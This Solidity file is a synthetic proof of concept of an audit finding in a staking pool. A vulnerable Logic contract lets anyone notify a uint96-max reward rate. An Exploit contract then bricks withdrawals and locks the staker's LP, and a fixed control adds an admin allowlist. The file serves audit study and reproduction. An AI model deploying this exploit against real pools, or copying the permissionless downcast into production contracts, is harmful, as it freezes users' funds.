// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Paladin Valkyrie — permissionless reward notify bricks the pool
    (Cyfrin / Draiakoo, finding #61555, 12 March 2025).

    SYNTHETIC, cheatcode-free. The playground replays constructor and run()
    in one block (anvil timestamp 0x1), so `nowTs` stands in for
    `block.timestamp`. The index formula and the uint96 downcast are the
    report's lines. Anyone can notify a rate of uint96 max. Two seconds
    later every update reverts, and the staker receives 0 of N = 1 LP.
    Control: only the reward admin may notify, and the staker withdraws N. */

contract Token {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol, uint8 _decimals) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "bal");
        require(allowance[from][msg.sender] >= amount, "allow");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Logic {
    uint256 public constant UNIT = 1e18;

    struct RewardData {
        uint96 rewardPerTokenStored;
        uint96 ratePerSec;
        uint32 lastUpdateTime;
        uint32 endTimestamp;
    }

    Token public lp;
    Token public reward;
    uint256 public nowTs;
    uint256 public totalLiquidity;
    mapping(address => uint256) public userLiquidity;
    RewardData public rewardData;

    constructor(Token _lp, Token _reward) {
        lp = _lp;
        reward = _reward;
        nowTs = 1_700_000_000;
    }

    function advance(uint256 dt) external {
        nowTs += dt;
    }

    function toUint96(uint256 x) public pure returns (uint96) {
        require(x <= uint256(type(uint96).max), "uint96");
        return uint96(x);
    }

    function toUint32(uint256 x) public pure returns (uint32) {
        require(x <= uint256(type(uint32).max), "uint32");
        return uint32(x);
    }

    function stake(uint256 amount) external {
        totalLiquidity += amount;
        userLiquidity[msg.sender] += amount;
        lp.transferFrom(msg.sender, address(this), amount);
    }

    /// @dev Permissionless. No token allowlist and no caller check.
    function depositRewards(uint256 amount, uint256 duration) external {
        require(duration >= 1 weeks, "duration");
        reward.transferFrom(msg.sender, address(this), amount);
        uint256 rate = amount / duration;
        rewardData.ratePerSec = toUint96(rate);
        rewardData.endTimestamp = toUint32(nowTs + duration);
        rewardData.lastUpdateTime = uint32(nowTs);
    }

    function removeLiquidity(uint256 amount) external returns (uint256) {
        _updateRewardState(msg.sender);
        userLiquidity[msg.sender] -= amount;
        totalLiquidity -= amount;
        lp.transfer(msg.sender, amount);
        return amount;
    }

    function claim() external returns (uint256) {
        _updateRewardState(msg.sender);
        return 0;
    }

    function _updateRewardState(address account) internal {
        // @> VULN: permissionless uint96-max rate makes this downcast revert and brick the pool
        uint96 newRewardPerToken = toUint96(_newRewardPerToken());
        // FIX: allowlist the reward token (or the caller) so this rate cannot be set
        rewardData.rewardPerTokenStored = newRewardPerToken;
        uint32 endTimestampCache = rewardData.endTimestamp;
        rewardData.lastUpdateTime = nowTs < endTimestampCache ? uint32(nowTs) : endTimestampCache;
        account;
    }

    function _newRewardPerToken() internal view returns (uint256) {
        uint256 _totalSupply = totalLiquidity;
        RewardData memory _state = rewardData;
        if (_totalSupply == 0) return _state.rewardPerTokenStored;

        uint256 lastUpdateTimeApplicable = nowTs < _state.endTimestamp ? nowTs : _state.endTimestamp;

        return _state.rewardPerTokenStored
            + ((((lastUpdateTimeApplicable - _state.lastUpdateTime) * _state.ratePerSec) * UNIT) / _totalSupply);
    }
}

contract Victim {
    Logic public logic;
    Token public lp;

    constructor(Logic _logic, Token _lp) {
        logic = _logic;
        lp = _lp;
    }

    function stake(uint256 amount) external {
        lp.approve(address(logic), amount);
        logic.stake(amount);
    }

    function tryRemove(uint256 amount) external returns (bool) {
        try logic.removeLiquidity(amount) returns (uint256) {
            return true;
        } catch {
            return false;
        }
    }

    function tryClaim() external returns (bool) {
        try logic.claim() returns (uint256) {
            return true;
        } catch {
            return false;
        }
    }
}

contract Exploit {
    uint256 public constant N = 1 ether;

    Token public lp;
    Token public reward;
    Logic public logic;
    Victim public victim;
    bool public removeReverted;
    bool public claimReverted;
    uint256 public locked;
    uint256 public stakerLp;
    uint96 public rate;

    constructor() {
        lp = new Token("Liquidity", "LP", 18); // nonce 1
        reward = new Token("Malicious", "MAL", 18); // nonce 2
        logic = new Logic(lp, reward); // nonce 3
        victim = new Victim(logic, lp); // nonce 4
    }

    function run() external {
        lp.mint(address(victim), N);
        victim.stake(N);
        uint256 amount = uint256(type(uint96).max) * 1 weeks;
        reward.mint(address(this), amount);
        reward.approve(address(logic), amount);
        logic.depositRewards(amount, 1 weeks);
        (, uint96 rateNow,,) = logic.rewardData();
        rate = rateNow;
        require(rate == type(uint96).max, "rate");
        logic.advance(2);
        removeReverted = !victim.tryRemove(N);
        claimReverted = !victim.tryClaim();
        locked = lp.balanceOf(address(logic));
        stakerLp = lp.balanceOf(address(victim));
        require(removeReverted, "remove did not revert");
        require(claimReverted, "claim did not revert");
        require(stakerLp == 0, "staker received LP");
        require(locked == N, "staker did not receive 0 of N");
    }
}

/// @dev Control: reward notifies are restricted to the admin. The malicious
///      caller is rejected and the staker withdraws the full N.
contract LogicFixed {
    Token public lp;
    Token public reward;
    address public admin;
    uint256 public totalLiquidity;
    mapping(address => uint256) public userLiquidity;

    constructor(Token _lp, Token _reward, address _admin) {
        lp = _lp;
        reward = _reward;
        admin = _admin;
    }

    function stake(uint256 amount) external {
        totalLiquidity += amount;
        userLiquidity[msg.sender] += amount;
        lp.transferFrom(msg.sender, address(this), amount);
    }

    function depositRewards(uint256 amount, uint256 duration) external {
        require(msg.sender == admin, "allowlist");
        require(duration >= 1 weeks && duration <= 4 weeks, "duration");
        reward.transferFrom(msg.sender, address(this), amount);
    }

    function removeLiquidity(uint256 amount) external returns (uint256) {
        userLiquidity[msg.sender] -= amount;
        totalLiquidity -= amount;
        lp.transfer(msg.sender, amount);
        return amount;
    }
}
